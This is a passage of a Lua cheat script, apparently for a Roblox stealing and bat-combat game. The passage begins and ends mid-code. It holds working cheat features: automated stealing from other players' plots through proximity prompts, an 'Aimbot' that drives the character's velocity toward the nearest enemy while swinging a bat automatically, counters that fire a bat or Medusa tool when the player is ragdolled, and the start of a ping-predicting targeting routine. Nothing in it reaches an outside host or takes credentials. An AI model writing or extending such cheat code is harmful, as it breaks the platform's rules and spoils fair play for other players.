	StealState.active = false
	StealState.lastResultTime = tick()
	setStealState(false)

	if fired then
	V2Grab.totalSteals = V2Grab.totalSteals + 1
	V2Grab.lastResult = "Stole"
	V2Grab.phase = "success"
	StealState.totalSteals = StealState.totalSteals + 1
	StealState.lastResult = "Stole"
	else
	V2Grab.failedSteals = V2Grab.failedSteals + 1
	V2Grab.lastResult = "Missed window"
	V2Grab.phase = "failed"
	StealState.failedSteals = StealState.failedSteals + 1
	StealState.lastResult = "Missed window"
	end

	task.wait(V2GrabConfig.COOLDOWN)
	if runGen == V2Grab.generation then
	V2Grab.progress = 0
	v1Progress = 0
	V2Grab.phase = "idle"
	end
	end)
	end

	local function _startStealHeartbeat()
	if stealConnection then return end
	local elapsed = 0
	stealConnection = RunService.Heartbeat:Connect((function(dt)
	elapsed = elapsed + (dt or 0)
	local scanInterval = 0.15
	if elapsed < scanInterval then return end
	elapsed = 0
	if not CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then return end
	if Player:GetAttribute("Stealing") == true then return end
	if _G.__UnoAutoGrabRagdollBlocked == true then return end
	if StealState.active or V2.busy or V3New.busy or V2Grab.busy then return end
	if autoStealMode == "v2" then
	local prompt = v3NewFindNearestPrompt(autoStealValues.Radius)
	if prompt then v2GrabExecuteSteal(prompt) end
	return
	end
	if autoStealMode == "v1" then
	local prompt = v3NewFindNearestPrompt(autoStealValues.Radius)
	if prompt then v3NewExecuteSteal(prompt) end
	return
	end
	end))
	end

	_G.UnoAutoStealRunCycle = function(prompt, target)
	return attemptSteal(prompt, target)
	end

	local function stopStealDetection()
	if _stealDetectConns then for _, c in ipairs(_stealDetectConns) do pcall(function() c:Disconnect() end) end end
	_stealDetectConns = {}
	if _stealDetectTimer then task.cancel(_stealDetectTimer); _stealDetectTimer = nil end
	end

	local startStealDetection = (function(char)
	stopStealDetection()
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	table.insert(_stealDetectConns, hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
	setStealState(hum.WalkSpeed < 22)
	end))
	local function watchPrompt(obj)
	if not obj:IsA("ProximityPrompt") then return end
	table.insert(_stealDetectConns, obj.PromptButtonHoldBegan:Connect(function(player)
	if player ~= LP then return end
	setStealState(true)
	if _stealDetectTimer then task.cancel(_stealDetectTimer) end
	_stealDetectTimer = task.delay(CONFIG_AUTO_STEAL.HOLD_MAX + 0.5, function()
	setStealState(false)
	end)
	end))
	table.insert(_stealDetectConns, obj.Triggered:Connect(function(player)
	if player ~= LP then return end
	task.delay(0.2, function() setStealState(false) end)
	end))
	end

	table.insert(_stealDetectConns, workspace.DescendantAdded:Connect(function(obj)
	task.defer(watchPrompt, obj)
	end))
	_G.__UnoWalkDescendantsBatched(plots, watchPrompt, function()
	return char.Parent ~= nil
	end)
	end)

	local function ensureSyncLoop()
	if syncLoopStarted then return end
	syncLoopStarted = true
	task.spawn(function()
	if startAutoStealSync() then
	if CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then scanAllPlots() end
	while crystalRuntimeState.alive do
	task.wait(5)
	if not crystalRuntimeState.alive then break end
	if CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then scanAllPlots() end
	end
	end
	end)
	end

	ensureSyncLoop()
	if Player.Character then task.defer(startStealDetection, Player.Character) end
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	startStealDetection(char)
	if toggleStates["auto steal"] then
	CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED = false
	if stealConnection then stealConnection:Disconnect(); stealConnection = nil end
	CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED = true
	scanAllPlots()
	_startStealHeartbeat()
	end
	end))

	_G.UnoAutoGrab = {
	GetMode = function() return autoStealMode end,
	SetMode = function(mode)
	if mode ~= "v1" and mode ~= "v2" then return false end
	autoStealMode = mode
	saveConfig()
	return true
	end,
	}

	local function enableAutoSteal()
	ensureSyncLoop()
	scanAllPlots()
	CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED = true
	_startStealHeartbeat()
	end

	local function disableAutoSteal()
	autoStealGeneration = autoStealGeneration + 1
	if stealConnection then stealConnection:Disconnect(); stealConnection = nil end
	CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED = false
	StealState.active = false
	StealState.phase = "idle"
	setStealState(false)
	v1Progress = 0
	InternalStealCache = {}
	V2.busy = false
	V2.data = {}
	if V3New then
	V3New.generation = V3New.generation + 1
	V3New.busy = false
	V3New.active = false
	V3New.isStealing = false
	V3New.progress = 0
	V3New.phase = "idle"
	V3New.data = {}
	end
	if V2Grab then
	V2Grab.generation = V2Grab.generation + 1
	V2Grab.busy = false
	V2Grab.active = false
	V2Grab.paused = false
	V2Grab.pauseTime = nil
	V2Grab.progress = 0
	V2Grab.phase = "idle"
	V2Grab.data = {}
	end
	end

	autoStealDisableInternal = disableAutoSteal
	_G.__UnoTrackConn(Player.CharacterRemoving:Connect(disableAutoSteal))
	_G.__UnoTrackStopper(disableAutoSteal)

	;(function()
	local restartSerial = 0
	local humanoidStateConnection = nil
	local platformStandConnection = nil
	local stoneSignalConnection = nil
	local ragdollLatched = false
	local ragdollResumeScheduled = false
	local stoneDetectedUntil = 0
	local RAGDOLL_DURATION = 3.0
	local RAGDOLL_REMAINING_BEFORE_GRAB = 2.0
	local STONE_MEMORY_DURATION = 5.0

	local function isRagdollState(hum, state)
	return hum.PlatformStand
	or state == Enum.HumanoidStateType.Physics
	or state == Enum.HumanoidStateType.Ragdoll
	or state == Enum.HumanoidStateType.FallingDown
	end

	local function hasPetrificationSignal(char)
	if not char then return false end
	for _, obj in ipairs(char:GetDescendants()) do
	if not obj:FindFirstAncestorOfClass("Tool") then
	local name = obj.Name:lower()
	if name:find("medusa") or name:find("petrif") or name:find("gorgon") or name:find("stone") then
	return true
	end
	for attributeName, value in pairs(obj:GetAttributes()) do
	local key = tostring(attributeName):lower()
	if value and (key:find("medusa") or key:find("petrif") or key:find("gorgon") or key:find("stone")) then
	return true
	end
	end
	end
	end
	return false
	end

	local function restartAfterRagdoll(_cameFromStone)
	restartSerial = restartSerial + 1
	local thisRestart = restartSerial
	_G.__UnoAutoGrabRagdollBlocked = true
	ragdollResumeScheduled = true
	disableAutoSteal()

	task.delay(math.max(0, RAGDOLL_DURATION - RAGDOLL_REMAINING_BEFORE_GRAB), function()
	if thisRestart ~= restartSerial then return end
	ragdollResumeScheduled = false
	if not toggleStates["auto steal"] then return end
	_G.__UnoAutoGrabRagdollBlocked = false
	if not CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then enableAutoSteal() end
	end)
	end

	local function bindRagdollRestart(char)
	if humanoidStateConnection then
	humanoidStateConnection:Disconnect()
	humanoidStateConnection = nil
	end
	if platformStandConnection then
	platformStandConnection:Disconnect()
	platformStandConnection = nil
	end
	if stoneSignalConnection then
	stoneSignalConnection:Disconnect()
	stoneSignalConnection = nil
	end
	ragdollLatched = false
	stoneDetectedUntil = 0
	local hum = char and (char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5))
	if not hum then return end
	if hasPetrificationSignal(char) then
	stoneDetectedUntil = tick() + STONE_MEMORY_DURATION
	end
	stoneSignalConnection = char.DescendantAdded:Connect(function(obj)
	if obj:FindFirstAncestorOfClass("Tool") then return end
	local name = obj.Name:lower()
	if name:find("medusa") or name:find("petrif") or name:find("gorgon") or name:find("stone") then
	stoneDetectedUntil = tick() + STONE_MEMORY_DURATION
	end
	end)
	local function updateRagdollState(state)
	if hasPetrificationSignal(char) then
	stoneDetectedUntil = tick() + STONE_MEMORY_DURATION
	end
	local ragdolled = isRagdollState(hum, state)
	if ragdolled and not ragdollLatched then
	ragdollLatched = true
	restartAfterRagdoll(tick() <= stoneDetectedUntil)
	elseif not ragdolled then
	ragdollLatched = false

	if not ragdollResumeScheduled then
	_G.__UnoAutoGrabRagdollBlocked = false
	if toggleStates["auto steal"] and not CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then
		enableAutoSteal()
	end
	end
	end
	end
	humanoidStateConnection = hum.StateChanged:Connect(function(_, state)
	updateRagdollState(state)
	end)
	platformStandConnection = hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
	updateRagdollState(hum:GetState())
	end)
	end

	if Player.Character then task.defer(bindRagdollRestart, Player.Character) end
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(char)
	restartSerial = restartSerial + 1
	ragdollResumeScheduled = false
	_G.__UnoAutoGrabRagdollBlocked = false
	bindRagdollRestart(char)
	end))
	end)()

	FeaturePostToggle["auto steal"] = function(active)
	if active then
	if _G.__UnoAutoGrabRagdollBlocked ~= true then enableAutoSteal() end
	else
	disableAutoSteal()
	end
	end

	if toggleStates["auto steal"] then enableAutoSteal() end
	end

	do

	do
	local function setFeatureState(featureName, state)
	if toggleStates[featureName] == state then return end
	toggleStates[featureName] = state

	if FeaturePostToggle[featureName] then
	FeaturePostToggle[featureName](state)
	end
	if toggleVisualUpdaters[featureName] then
	toggleVisualUpdaters[featureName]()
	end
	saveConfig()
	end

	local function disableBoth()
	setFeatureState("Autoplay", false)
	end

	local function showStealCountdown(char)
	if not char then return end

	local nowT = os.clock()
	if _G._UnoHitCountdownLast and (nowT - _G._UnoHitCountdownLast) < 0.15 then return end
	_G._UnoHitCountdownLast = nowT

	local gen = (_G._UnoHitCountdownGen or 0) + 1
	_G._UnoHitCountdownGen = gen
	_G._UnoHitCountdownActive = true
	if _G._UnoHitCountdownBB then
	pcall(function() _G._UnoHitCountdownBB:Destroy() end)
	_G._UnoHitCountdownBB = nil
	end

	pcall(function() _G._UnoShowStealCountdown = showStealCountdown end)
	local root = char:FindFirstChild("LowerTorso") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("HumanoidRootPart")
	if not root then _G._UnoHitCountdownActive = false; return end
	local bb = Instance.new("BillboardGui")
	bb.Name = "UnoHitCountdown"
	bb.Adornee = root
	bb.Size = UDim2.new(0, 120, 0, 56)
	bb.StudsOffset = Vector3.new(0, 0.6, 0)
	bb.AlwaysOnTop = true
	bb.LightInfluence = 0
	local parentGui = Player and (Player:FindFirstChildOfClass("PlayerGui") or game:GetService("CoreGui")) or game:GetService("CoreGui")
	bb.Parent = parentGui
	_G._UnoHitCountdownBB = bb

	local frame = Instance.new("Frame", bb)
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0

	local label = Instance.new("TextLabel", frame)
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Position = UDim2.new(0, 0, 0, 6)
	label.BackgroundTransparency = 1
	label.Text = "3"
	label.TextScaled = false
	label.TextSize = 28
	label.Font = Enum.Font.GothamBlack
	label.TextColor3 = Color3.fromRGB(175, 180, 185)
	label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	label.TextStrokeTransparency = 0
	label.ZIndex = 10
	label.TextTransparency = 1

	local function animateText(txt, color)
	label.Text = txt
	if color then label.TextColor3 = color end
	local hold = (txt == "STEAL!") and 1.0 or 0.76

	for i = 0, 6 do
	label.TextTransparency = 1 - (i / 6)
	task.wait(0.02)
	if _G._UnoHitCountdownGen ~= gen then return false end
	end
	task.wait(hold)
	if _G._UnoHitCountdownGen ~= gen then return false end

	for i = 0, 6 do
	label.TextTransparency = i / 6
	task.wait(0.02)
	if _G._UnoHitCountdownGen ~= gen then return false end
	end
	return true
	end

	task.spawn(function()
	pcall(function()
	label.TextStrokeTransparency = 0
	label.TextColor3 = Color3.fromRGB(175, 180, 185)
	for step = 0, 24 do
	local value = 2.4 - (2.4 * step / 24)
	local display = value <= 0.05 and "0" or string.format("%.1f", value)
	label.Text = display
	label.TextTransparency = 0
	for i = 0, 2 do
	label.TextTransparency = 0.18 * i
	task.wait(0.02)
	if _G._UnoHitCountdownGen ~= gen then return end
	end
	if _G._UnoHitCountdownGen ~= gen then return end
	task.wait(0.08)
	if _G._UnoHitCountdownGen ~= gen then return end
	end
	if not animateText("STEAL!", Color3.fromRGB(175, 180, 185)) then return end
	end)

	if _G._UnoHitCountdownGen == gen then
	pcall(function() bb:Destroy() end)
	if _G._UnoHitCountdownBB == bb then _G._UnoHitCountdownBB = nil end
	_G._UnoHitCountdownActive = false
	-- If Auto Play was turned on during countdown, start it NOW (Semi/Full as selected)
	local shouldStart = (_G.__UnoPendingAutoplayAfterCountdown == true) or (toggleStates["Autoplay"] == true)
	_G.__UnoPendingAutoplayAfterCountdown = false
	if shouldStart and toggleStates["Autoplay"] == true then
	task.defer(function()
	if toggleStates["Autoplay"] ~= true then return end
	if Player:GetAttribute("Stealing") == true then return end
	pcall(function()
	if type(_G.__UnoStartAutoplay) == "function" then
	_G.__UnoStartAutoplay()
	elseif FeaturePostToggle and type(FeaturePostToggle["Autoplay"]) == "function" then
	-- Active already false; force start path
	FeaturePostToggle["Autoplay"](true)
	end
	end)
	end)
	end
	end
	end)
	end

	local function attachDamageDetection(char)
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local lastHealth = hum.Health

	hum.HealthChanged:Connect(function(newHealth)
	if newHealth < lastHealth then
	disableBoth()
	pcall(function() showStealCountdown(char) end)
	end
	lastHealth = newHealth
	end)

	if hum.StateChanged then
	hum.StateChanged:Connect(function(oldState, newState)
	local isRagdolled = (newState == Enum.HumanoidStateType.Physics or newState == Enum.HumanoidStateType.Ragdoll or newState == Enum.HumanoidStateType.FallingDown)
	if isRagdolled then
	pcall(function() showStealCountdown(char) end)
	end
	end)
	end

	pcall(function()
	hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
	if hum.PlatformStand then pcall(function() showStealCountdown(char) end) end
	end)
	end)

	hum.Died:Connect(function()
	disableBoth()
	end)

	end

	if Player.Character then
	attachDamageDetection(Player.Character)
	end

	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(char)
	local hum = char:WaitForChild("Humanoid", 5)
	if hum then
	disableBoth()
	attachDamageDetection(char)
	else
	task.wait(0.5)
	disableBoth()
	attachDamageDetection(char)
	end
	end))
	end

	do
	local unwalkState = {
		generation = 0,
		animationConn = nil,
		animate = nil,
		disabledByUs = false,
	}

	local function disconnectUnwalk()
		unwalkState.generation += 1
		if unwalkState.animationConn then
			unwalkState.animationConn:Disconnect()
			unwalkState.animationConn = nil
		end
	end

	local function resumeAnimations(force)
		local animate = unwalkState.animate
		local shouldEnable = unwalkState.disabledByUs
		unwalkState.animate = nil
		unwalkState.disabledByUs = false
		if animate and animate.Parent and shouldEnable and (force or not toggleStates["Unwalk"]) then
			pcall(function() animate.Disabled = false end)
		end
	end

	local function applyUnwalk(character)
		local previousAnimate = unwalkState.animate
		local previouslyDisabledByUs = unwalkState.disabledByUs
		disconnectUnwalk()
		if not toggleStates["Unwalk"] or character ~= Player.Character then return end
		local generation = unwalkState.generation
		local humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 5)
		local animate = character:FindFirstChild("Animate") or character:WaitForChild("Animate", 5)
		if not humanoid or not animate or generation ~= unwalkState.generation or not toggleStates["Unwalk"] then return end
		unwalkState.animate = animate
		unwalkState.disabledByUs = (previousAnimate == animate and previouslyDisabledByUs)
			or (animate:IsA("LocalScript") and not animate.Disabled)
		if animate:IsA("LocalScript") then animate.Disabled = true end

		local function stopAllTracks()
			if generation ~= unwalkState.generation or not toggleStates["Unwalk"]
				or character ~= Player.Character or humanoid.Parent ~= character then return end
			for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
				pcall(function() track:Stop(0) end)
			end
		end

		unwalkState.animationConn = humanoid.AnimationPlayed:Connect(function(track)
			if generation ~= unwalkState.generation or not toggleStates["Unwalk"] then return end
			pcall(function() track:Stop(0) end)
		end)

		stopAllTracks()
	end

	FeaturePostToggle["Unwalk"] = function(active)
		if active then
			applyUnwalk(Player.Character)
		else
			disconnectUnwalk()
			resumeAnimations(false)
		end
	end
	_G.__UnoTrackStopper(function()
		disconnectUnwalk()
		resumeAnimations(true)
	end)
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(character)
		if not toggleStates["Unwalk"] then return end
		task.defer(function() applyUnwalk(character) end)
	end))
	if toggleStates["Unwalk"] then
		task.defer(function() applyUnwalk(Player.Character) end)
	end
	end

	do
	local counterConn  = nil
	local wasRagdolled = false

	local function getBat()
	local char = Player.Character
	if not char then return nil end
	local equipped = char:FindFirstChildOfClass("Tool")
	if equipped and equipped.Name:lower():find("bat") then return equipped end
	local bp = Player:FindFirstChild("Backpack")
	if bp then
	local hum = char:FindFirstChildOfClass("Humanoid")
	for _, t in ipairs(bp:GetChildren()) do
	if t:IsA("Tool") and t.Name:lower():find("bat") then
	if hum then pcall(function() hum:EquipTool(t) end) end
	return char:FindFirstChild(t.Name) or t
	end
	end
	end
	return nil
	end

	local function getClosest(hrp)
	local best, bestDist = nil, math.huge
	for _, p in ipairs(Players:GetPlayers()) do
	if p ~= Player and p.Character then
	local r = p.Character:FindFirstChild("HumanoidRootPart")
	local targetHumanoid = p.Character:FindFirstChildOfClass("Humanoid")
	if r and targetHumanoid and targetHumanoid.Health > 0 then
	local d = (hrp.Position - r.Position).Magnitude
	if d < bestDist then bestDist = d; best = r end
	end
	end
	end
	return best, bestDist
	end

	local function onRagdoll(hrp)
	if ragdollCounterPaused or not toggleStates["Ragdoll Counter"] then return end
	local char = Player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not char or not hum or not root or hum.Health <= 0 then return end
	local targetRoot, distance = getClosest(root)

	if targetRoot and distance <= 4 then
		local lookPosition = Vector3.new(targetRoot.Position.X, root.Position.Y, targetRoot.Position.Z)
		if (lookPosition - root.Position).Magnitude > 0.01 then
			pcall(function()
				hum.AutoRotate = false
				root.CFrame = CFrame.lookAt(root.Position, lookPosition)
			end)
		end
	end
	local bat = getBat()
	if bat then
	pcall(function() bat:Activate() end)
	local remote = bat:FindFirstChildWhichIsA("RemoteEvent", true)
	if remote then pcall(function() remote:FireServer() end) end
	end
	task.defer(function()
	if hum.Parent then hum.AutoRotate = true end
	end)
	end

	local function startRagdollCounter()
	if counterConn then return end
	local char = Player.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then return end

	counterConn = {}

	do
	local ok, con = pcall(function()
	return hum.StateChanged:Connect(function(_, newState)
	if ragdollCounterPaused or not toggleStates["Ragdoll Counter"] then return end
	local isRag = (newState == Enum.HumanoidStateType.Physics or newState == Enum.HumanoidStateType.Ragdoll or newState == Enum.HumanoidStateType.FallingDown)
	if isRag and not wasRagdolled then wasRagdolled = true; pcall(function() onRagdoll(hrp) end)
	elseif not isRag and wasRagdolled then wasRagdolled = false end
	end)
	end)
	if ok and con then table.insert(counterConn, con) end
	end

	do
	local ok, con = pcall(function()
	return hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
	if ragdollCounterPaused or not toggleStates["Ragdoll Counter"] then return end
	if hum.PlatformStand and not wasRagdolled then
	wasRagdolled = true
	pcall(function() onRagdoll(hrp) end)
	elseif not hum.PlatformStand then
	wasRagdolled = false
	end
	end)
	end)
	if ok and con then table.insert(counterConn, con) end
	end
	end

	local function stopRagdollCounter()
	if counterConn then
	for _, c in ipairs(counterConn) do pcall(function() c:Disconnect() end) end
	counterConn = nil
	end
	wasRagdolled = false
	end

	FeaturePostToggle["Ragdoll Counter"] = function(active)
	if active then startRagdollCounter() else stopRagdollCounter() end
	end

	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function()
	task.wait(0.5); wasRagdolled = false
	if toggleStates["Ragdoll Counter"] then
	stopRagdollCounter()
	startRagdollCounter()
	end
	end))

	if toggleStates["Ragdoll Counter"] then startRagdollCounter() end
	end

	do

	local MEDUSA_COOLDOWN = 25
	local medusaDebounce = false
	local medusaLastUsed = 0
	local medusaCounterEnabled = false
	local medusaConns = {}

	local function findMedusa()
	local char = Player.Character
	if not char then return nil end
	for _, t in ipairs(char:GetChildren()) do
	if t:IsA("Tool") and (t.Name:lower():find("medusa") or t.Name:lower():find("head") or t.Name:lower():find("stone")) then
	return t
	end
	end
	local bp = Player:FindFirstChild("Backpack")
	if bp then
	for _, t in ipairs(bp:GetChildren()) do
	if t:IsA("Tool") and (t.Name:lower():find("medusa") or t.Name:lower():find("head") or t.Name:lower():find("stone")) then
	return t
	end
	end
	end
	return nil
	end

	local function useMedusa()
	if not medusaCounterEnabled then return end
	if medusaDebounce then return end
	if tick() - medusaLastUsed < MEDUSA_COOLDOWN then return end
	local char = Player.Character
	if not char then return end
	medusaDebounce = true
	local med = findMedusa()
	if not med then
	medusaDebounce = false
	return
	end
	if med.Parent ~= char then
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then pcall(function() hum:EquipTool(med) end) end
	task.wait(0.05)
	end
	pcall(function() med:Activate() end)
	medusaLastUsed = tick()
	medusaDebounce = false
	end

	local function onAnchorChanged(part)
	return part:GetPropertyChangedSignal("Anchored"):Connect(function()
	if medusaCounterEnabled and part.Anchored and part.Transparency == 1 then
	useMedusa()
	end
	end)
	end

	local function setupMedusa(char)
	for _, c in pairs(medusaConns) do
	pcall(function() c:Disconnect() end)
	end
	medusaConns = {}
	if not char then return end
	for _, part in ipairs(char:GetDescendants()) do
	if part:IsA("BasePart") then
	table.insert(medusaConns, onAnchorChanged(part))
	end
	end
	table.insert(medusaConns, char.DescendantAdded:Connect(function(part)
	if part:IsA("BasePart") then
	table.insert(medusaConns, onAnchorChanged(part))
	end
	end))
	end

	local function startMedusaCounter()
	medusaCounterEnabled = true
	if Player.Character then
	setupMedusa(Player.Character)
	end
	end

local function stopMedusaCounter()
	medusaCounterEnabled = false
	for _, c in pairs(medusaConns) do
	pcall(function() c:Disconnect() end)
	end
medusaConns = {}
end
_G.__UnoTrackStopper(stopMedusaCounter)
FeaturePostToggle["Medusa Counter"] = function(active)
if active then startMedusaCounter() else stopMedusaCounter() end
end

	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(newChar)
	task.wait(0.5)
	if medusaCounterEnabled then
	setupMedusa(newChar)
	end
	end))

if toggleStates["Medusa Counter"] then
	startMedusaCounter()
	end
	end

	do
	local LP = Player

	local function getBat()
	local char = LP.Character
	if char then
	local equippedTool = char:FindFirstChildOfClass("Tool")
	if equippedTool then
	local equippedName = equippedTool.Name:lower()
	if equippedName:find("bat", 1, true) or equippedName:find("slap", 1, true) then
	return equippedTool
	end
	end
	local backpack = LP:FindFirstChildOfClass("Backpack")
	if backpack then
	for _, tool in ipairs(backpack:GetChildren()) do
	if tool:IsA("Tool") then
	local toolName = tool.Name:lower()
	if toolName:find("bat", 1, true) or toolName:find("slap", 1, true) then
	return tool
	end
	end
	end
	end
	end
	return nil
	end

	local _cypherConn = nil

	_G.__UnoAceNormalAimbot = _G.__UnoAceNormalAimbot or {
	target = nil,
	swingCooldown = false,
	nextSwingAt = 0,
	}
	local function getEnemyRenderCFrame(root)
	if not root then return nil end
	local rendered = root.CFrame

	local ok, current = pcall(root.GetRenderCFrame, root)
	if ok and current then rendered = current end
	return rendered
	end

	_cypherStartFollowing = function(char)
	char = char or Player.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not humanoid or not root then return end
	if _cypherConn then _cypherConn:Disconnect(); _cypherConn = nil end
	_G.__UnoAceNormalAimbot.nextSwingAt = 0
	_G.__UnoAceNormalAimbot.swingCooldown = false
	humanoid.AutoRotate = false
	local initialBat = char:FindFirstChildOfClass("Tool") or getBat()
	if initialBat and initialBat.Parent ~= char then
	pcall(humanoid.EquipTool, humanoid, initialBat)
	end

	_cypherConn = RunService.RenderStepped:Connect((function()
	if not toggleStates["Aimbot"] then return end
	local currentChar = Player.Character
	if not currentChar then return end
	local currentRoot = currentChar:FindFirstChild("HumanoidRootPart")
	local currentHumanoid = currentChar:FindFirstChildOfClass("Humanoid")
	if not currentRoot or not currentHumanoid then return end
	if currentHumanoid.AutoRotate then currentHumanoid.AutoRotate = false end

	local bat = currentChar:FindFirstChildOfClass("Tool") or getBat()
	if bat and bat.Parent ~= currentChar then
	pcall(currentHumanoid.EquipTool, currentHumanoid, bat)
	end

	local markerCFrame = nil
	if _G.__UnoTPBatGetMarkerCFrame then
	local ok, result = pcall(_G.__UnoTPBatGetMarkerCFrame)
	if ok then markerCFrame = result end
	end

	local visualTarget = nil
	local visualTargetCFrame = nil
	local visualEnemy = _G.__UnoGetVisualEnemy and _G.__UnoGetVisualEnemy()
	if visualEnemy and visualEnemy ~= Player and visualEnemy.Character then
	local visualRoot = visualEnemy.Character:FindFirstChild("HumanoidRootPart")
	local visualHumanoid = visualEnemy.Character:FindFirstChildOfClass("Humanoid")
	if visualRoot and visualHumanoid and visualHumanoid.Health > 0 then
	visualTarget = visualRoot
	visualTargetCFrame = getEnemyRenderCFrame(visualRoot)
	end
	end
	if not markerCFrame and (not visualTarget or not visualTargetCFrame) then return end
	_G.__UnoAceNormalAimbot.target = markerCFrame or visualTarget

	local myPosition = currentRoot.Position
	local targetCFrame = markerCFrame or visualTargetCFrame
	local targetPosition = targetCFrame.Position
	local predictedChase = targetPosition
	local direction = predictedChase - myPosition
	local flatDirection = Vector3.new(direction.X, 0, direction.Z)

	local chaseSpeed = tonumber(speedValues.CypherAimbotApproachSpeed) or 55
	local horizontalVelocity = Vector3.zero
	if flatDirection.Magnitude >= 0.01 then
	horizontalVelocity = flatDirection.Unit * chaseSpeed
	end
	local verticalVelocity = (targetPosition.Y - myPosition.Y) * 19.5
	verticalVelocity = math.clamp(verticalVelocity, -70, 110)
	local desiredVelocity = Vector3.new(
	horizontalVelocity.X,
	verticalVelocity,
	horizontalVelocity.Z
	)
	currentRoot.AssemblyLinearVelocity = desiredVelocity

	local predictedPosition = targetPosition
	if (predictedPosition - myPosition).Magnitude > 0.1 then
	local goalCFrame = CFrame.lookAt(myPosition, predictedPosition)
	local difference = currentRoot.CFrame:Inverse() * goalCFrame
	local rx, ry, rz = difference:ToEulerAnglesXYZ()
	rx = math.clamp(rx, -2.5, 2.5)
	ry = math.clamp(ry, -2.5, 2.5)
	rz = math.clamp(rz, -2.5, 2.5)
	currentRoot.AssemblyAngularVelocity = currentRoot.CFrame:VectorToWorldSpace(
	Vector3.new(rx * 42, ry * 42, rz * 42)
	)
	end

	local swingNow = tick()
	if bat and swingNow >= (_G.__UnoAceNormalAimbot.nextSwingAt or 0) then
	_G.__UnoAceNormalAimbot.nextSwingAt = swingNow + 0.08
	pcall(bat.Activate, bat)
	end
	end))
	end

	_cypherStop = function()
	if _cypherConn then _cypherConn:Disconnect(); _cypherConn = nil end
	if _G.__UnoAceNormalAimbot then
	_G.__UnoAceNormalAimbot.target = nil
	_G.__UnoAceNormalAimbot.swingCooldown = false
	_G.__UnoAceNormalAimbot.nextSwingAt = 0
	end
	local char = Player.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if root then
	root.AssemblyLinearVelocity = Vector3.zero
	root.AssemblyAngularVelocity = Vector3.zero
	end
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	if humanoid then humanoid.AutoRotate = true end
	end

	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	if toggleStates["Aimbot"] then _cypherStartFollowing(char) end
	end))

	FeaturePostToggle["Aimbot"] = function(active)
	if active then
	if _G.__stopSpeedBoost then _G.__stopSpeedBoost() end
	if autoplayActive or toggleStates["Autoplay"] then
	_G.__stopAutoplay()
	end
	deactivateOtherAimbots("Aimbot")
	if _G.__deactivateBatExclusive then _G.__deactivateBatExclusive("Aimbot") end
	_G.__checkAndAutoDrop(function()
	local char = Player.Character
	if char then _cypherStartFollowing(char) end
	end)
	else
	_cypherStop()
	if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end
	end
	end

	do
	pcall(function()
	local oldSphere = workspace:FindFirstChild("PredictionSphere")
	if oldSphere then oldSphere:Destroy() end
	end)
	local Z = {
	targetPlayer = nil,
	lastTargetPos = nil,
	targetVelocity = Vector3.zero,
	smoothedVelocity = Vector3.zero,
	velocityHistory = {},
	accelerationHistory = {},
	aerialVelocityHistory = {},
	verticalVelocityHistory = {},
	previousDirection = nil,
	lastDirectionChangeTime = 0,
	airborneTime = 0,
	lastYVelocity = 0,
	lastJumpTime = 0,
	lastActivationTime = 0,
	currentPing = 0.1,
	realPingMs = 0,
	}
	local ZCFG = {
	FOLLOW_SPEED = 55,
	ACTIVATE_DISTANCE = 13,
	MIN_FOLLOW_DISTANCE = 1,
	PREDICTION_TIME = 0.22,
	PREDICT_AHEAD = 3,
	MAX_VELOCITY_CHANGE = 150,
	VELOCITY_SMOOTHING = 0.2,
	MAX_HORIZONTAL_VELOCITY = 80,
	SERVER_TICKRATE = 1 / 60,
	MIN_PING_COMPENSATION = 0.03,
	MAX_PING_COMPENSATION = 0.25,
	ACCELERATION_PREDICTION_WEIGHT = 0.3,
	DIRECTION_CHANGE_DETECTION_TIME = 0.12,
	QUICK_DIRECTION_CHANGE_MULTIPLIER = 1.5,
	GRAVITY = 196.2,
	AIR_CONTROL_FACTOR = 0.8,
	AERIAL_VELOCITY_DECAY = 0.95,
	MIN_AIRBORNE_TIME = 0.08,
	FALLING_SPEED_THRESHOLD = -15,
	}
	local zurichConn = nil
	local function averageVector(history)
	if #history == 0 then return Vector3.zero end
	local total = Vector3.zero
	for _, value in ipairs(history) do total += value end
	return total / #history
	end
	local function pushHistory(history, value, maximum)
	table.insert(history, value)
	if #history > maximum then table.remove(history, 1) end
	end
	local function resetZurichTarget()
	Z.targetPlayer = nil
	Z.lastTargetPos = nil
